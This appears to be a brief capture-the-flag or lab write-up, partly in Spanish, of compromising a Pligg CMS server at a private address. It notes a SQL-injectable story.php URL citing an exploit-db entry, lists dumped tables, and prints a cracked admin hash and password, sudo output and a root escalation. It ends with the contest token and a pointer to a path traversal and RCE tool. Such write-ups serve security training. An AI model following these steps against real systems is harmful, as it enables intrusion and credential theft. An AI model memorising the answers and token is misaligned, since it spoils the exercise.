# Ejercicio 2

https://www.exploit-db.com/exploits/38577

`http://172.18.1.68/pligg/story.php?title=secret-war&reply=1&comment_id=1` es vulnerable a SQL injection

## DBS
```
[*] base_de_pepe
[*] information_schema
```

## Tables
```
+-----------------------------+
| pligg_additional_categories |
| pligg_categories            |
| pligg_comments              |
| pligg_config                |
| pligg_formulas              |
| pligg_friends               |
| pligg_group_member          |
| pligg_group_shared          |
| pligg_groups                |
| pligg_links                 |
| pligg_login_attempts        |
| pligg_messages              |
| pligg_misc_data             |
| pligg_modules               |
| pligg_old_urls              |
| pligg_redirects             |
| pligg_saved_links           |
| pligg_tag_cache             |
| pligg_tags                  |
| pligg_totals                |
| pligg_trackbacks            |
| pligg_users                 |
| pligg_votes                 |
| pligg_widgets               |
+-----------------------------+
```

# Usuario barack
```
email:hash:role
bobama@nsa.gov.us:1bf490bb34c2383ac91e67505741b9cdad3b9bee87e62ba98:admin

It's also his SSH password and his SUDO password
```

After a lot of research, hash has the following type:
```
SHA1(salt.hash)
4c2383ac91e67505741b9cdad3b9bee87e62ba98:1bf490bb3
```

Password is `obamaobamaobama`

Turns out it's also his SSH password, and his SUDO password

Also

```
sudo -l
Matching Defaults entries for obama on server:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User obama may run the following commands on server:
    (ALL : ALL) ALL
```

So `sudo -i` and we are root

```
 _________________________________________
/ Congratulations, you win the Soft.      \
| Aplicativo's contest... The secret      |
| token is:                               |
| 7091996b0ccbb6c6145dca439f44cbe3c6c757e |
\ 476241d1cc64ec3dcf0f722fb               /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

# Path traversal and RCE 

Si no tuviera la misma password para SSH, deberiamos hacer algo con esto `https://github.com/jenaye/pligg` para conseguir una terminal con el usuario `www-data`, y desde ahi ver si podemos escalar